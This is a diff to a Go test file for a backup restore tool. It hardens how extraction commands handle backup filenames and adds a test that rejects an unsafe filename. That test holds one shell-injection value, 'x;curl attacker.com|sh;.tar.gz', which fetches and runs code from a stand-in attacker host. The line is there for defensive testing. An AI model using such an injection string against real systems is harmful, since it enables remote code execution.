@@ -8,7 +8,10 @@ import (
 )
 
 func TestBuildExtractionConfigUnencrypted(t *testing.T) {
-	cfg := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz", "offen-restore-staging", "restore123", "target-volume", "")
+	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz", "offen-restore-staging", "restore123", "target-volume", "")
+	if err != nil {
+		t.Fatalf("unexpected error: %s", err)
+	}
 
 	if cfg.Image != "alpine:latest" {
 		t.Fatalf("image: got %q, want %q", cfg.Image, "alpine:latest")
@@ -21,28 +24,38 @@ func TestBuildExtractionConfigUnencrypted(t *testing.T) {
 		t.Fatalf("cmd prefix: got %v, want [sh -c ...]", cfg.Cmd[:2])
 	}
 
-	wantCmd := "tar -xzf /staging/restore123/backup-2026-05-15T04-00-00.tar.gz -C /target --strip-components 2"
+	wantCmd := `tar -xzf "$BACKUP_FILE" -C /target --strip-components 2`
 	if cfg.Cmd[2] != wantCmd {
 		t.Fatalf("cmd:\ngot  %q\nwant %q", cfg.Cmd[2], wantCmd)
 	}
 
-	if len(cfg.Env) != 0 {
-		t.Fatalf("env: got %v, want empty", cfg.Env)
+	if len(cfg.Env) != 1 || cfg.Env[0] != "BACKUP_FILE=/staging/restore123/backup-2026-05-15T04-00-00.tar.gz" {
+		t.Fatalf("env: got %v, want [BACKUP_FILE=...]", cfg.Env)
 	}
 
 	assertMounts(t, cfg.Mounts, "offen-restore-staging", "target-volume")
 }
 
 func TestBuildExtractionConfigEncrypted(t *testing.T) {
-	cfg := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz.gpg", "offen-restore-staging", "restore456", "target-volume", "my-secret-pass")
+	cfg, err := restore.BuildExtractionConfig("backup-2026-05-15T04-00-00.tar.gz.gpg", "offen-restore-staging", "restore456", "target-volume", "my-secret-pass")
+	if err != nil {
+		t.Fatalf("unexpected error: %s", err)
+	}
 
-	wantCmd := `apk add --no-cache gnupg && gpg --batch --passphrase "$GPG_PASSPHRASE" -d /staging/restore456/backup-2026-05-15T04-00-00.tar.gz.gpg | tar -xz -C /target --strip-components 2`
+	wantCmd := `apk add --no-cache gnupg && gpg --batch --passphrase "$GPG_PASSPHRASE" -d "$BACKUP_FILE" | tar -xz -C /target --strip-components 2`
 	if cfg.Cmd[2] != wantCmd {
 		t.Fatalf("cmd:\ngot  %q\nwant %q", cfg.Cmd[2], wantCmd)
 	}
 
-	if len(cfg.Env) != 1 || cfg.Env[0] != "GPG_PASSPHRASE=my-secret-pass" {
-		t.Fatalf("env: got %v, want [GPG_PASSPHRASE=my-secret-pass]", cfg.Env)
+	if len(cfg.Env) != 2 {
+		t.Fatalf("env len: got %d, want 2", len(cfg.Env))
+	}
+}
+
+func TestBuildExtractionConfigUnsafeFilename(t *testing.T) {
+	_, err := restore.BuildExtractionConfig("x;curl attacker.com|sh;.tar.gz", "offen-restore-staging", "restore789", "target-volume", "")
+	if err == nil {
+		t.Fatal("expected error for unsafe filename, got nil")
 	}
 }
 
